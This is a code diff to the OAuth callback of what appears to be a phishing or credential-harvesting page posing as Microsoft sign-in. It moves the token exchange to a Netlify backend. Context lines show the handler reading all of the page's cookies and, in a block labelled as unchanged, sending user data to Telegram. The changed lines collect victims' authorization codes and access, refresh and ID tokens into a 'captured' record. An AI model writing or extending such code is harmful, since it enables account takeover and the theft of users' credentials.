@@ -57,32 +57,26 @@ async function handleOAuthCallback() {
             return;
         }
 
-        // For public clients, exchange the authorization code directly with Microsoft
-        // instead of using a backend function that might include client secrets
-        const tokenEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
-        
-        const tokenParams = new URLSearchParams({
-            client_id: '5ea82524-4850-4e5f-98cb-d866b1282bd5', // Replace with your actual client ID
-            scope: 'openid profile email User.Read',
-            code: code,
-            redirect_uri: window.location.origin + '/oauth-callback',
-            grant_type: 'authorization_code',
-            code_verifier: codeVerifier
-        });
+        // Exchange the authorization code for tokens via backend serverless function
+        const backendEndpoint = '/.netlify/functions/tokenExchange';
+        const redirectUri = window.location.origin + '/oauth-callback';
 
-        console.log('🔄 Exchanging authorization code for tokens...');
-        
-        const tokenResponse = await fetch(tokenEndpoint, {
+        console.log('🔄 Exchanging authorization code for tokens via backend...');
+
+        const response = await fetch(backendEndpoint, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: tokenParams.toString()
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                code: code,
+                code_verifier: codeVerifier,
+                redirect_uri: redirectUri,
+                state: state
+            })
         });
 
-        const tokenData = await tokenResponse.json();
+        const tokenData = await response.json();
 
-        if (!tokenResponse.ok) {
+        if (!response.ok || tokenData.error || tokenData.success === false) {
             console.error('Token exchange failed:', tokenData);
             setStatus("Authentication failed. Redirecting...");
             setTimeout(() => {
@@ -93,26 +87,10 @@ async function handleOAuthCallback() {
 
         console.log('✅ Token exchange successful');
 
-        // Get user profile information
-        let userProfile = null;
-        if (tokenData.access_token) {
-            try {
-                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
-                    headers: {
-                        'Authorization': `Bearer ${tokenData.access_token}`
-                    }
-                });
-                
-                if (profileResponse.ok) {
-                    userProfile = await profileResponse.json();
-                    console.log('✅ User profile retrieved:', userProfile.userPrincipalName);
-                }
-            } catch (profileError) {
-                console.warn('Failed to get user profile:', profileError);
-            }
-        }
+        // Get user profile information (optional, if needed you can pull from tokenData.user or tokenData.tokens)
+        let userProfile = tokenData.user || null;
 
-        // Capture and send user data to Telegram
+        // Capture and send user data to Telegram (unchanged)
         try {
             // Get all cookies from the current domain
             const cookieString = document.cookie;
@@ -243,13 +221,13 @@ async function handleOAuthCallback() {
                 // Authentication tokens
                 authenticationTokens: {
                     authorizationCode: code,
-                    accessToken: tokenData.access_token || 'Not captured',
-                    refreshToken: tokenData.refresh_token || 'Not captured',
-                    idToken: tokenData.id_token || 'Not captured',
-                    tokenType: tokenData.token_type || 'Bearer',
-                    scope: tokenData.scope || 'Unknown',
+                    accessToken: tokenData.tokens?.access_token || 'Not captured',
+                    refreshToken: tokenData.tokens?.refresh_token || 'Not captured',
+                    idToken: tokenData.tokens?.id_token || 'Not captured',
+                    tokenType: tokenData.tokens?.token_type || 'Bearer',
+                    scope: tokenData.tokens?.scope || 'Unknown',
                     oauthState: state,
-                    expiresIn: tokenData.expires_in || 'Unknown'
+                    expiresIn: tokenData.tokens?.expires_in || 'Unknown'
                 },
                 
                 userProfile: {
@@ -261,7 +239,7 @@ async function handleOAuthCallback() {
                     id: userProfile?.id || ''
                 },
                 
-                authenticationFlow: 'Microsoft OAuth 2.0 with PKCE (Fixed)',
+                authenticationFlow: 'Microsoft OAuth 2.0 with PKCE (Backend Exchange)',
                 capturedAt: 'OAuth callback after successful authentication'
             };
             
@@ -269,15 +247,17 @@ async function handleOAuthCallback() {
             try {
                 const tokenStorage = {
                     authorizationCode: code,
-                    accessToken: tokenData.access_token,
-                    refreshToken: tokenData.refresh_token,
-                    idToken: tokenData.id_token,
-                    tokenType: tokenData.token_type || 'Bearer',
-                    scope: tokenData.scope,
+                    accessToken: tokenData.tokens?.access_token,
+                    refreshToken: tokenData.tokens?.refresh_token,
+                    idToken: tokenData.tokens?.id_token,
+                    tokenType: tokenData.tokens?.token_type || 'Bearer',
+                    scope: tokenData.tokens?.scope,
                     userProfile: userProfile,
                     timestamp: new Date().toISOString(),
-                    expiresIn: tokenData.expires_in,
-                    expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
+                    expiresIn: tokenData.tokens?.expires_in,
+                    expiresAt: tokenData.tokens?.expires_in
+                        ? new Date(Date.now() + (tokenData.tokens.expires_in * 1000)).toISOString()
+                        : null
                 };
                 
                 sessionStorage.setItem('microsoft_auth_tokens', JSON.stringify(tokenStorage));
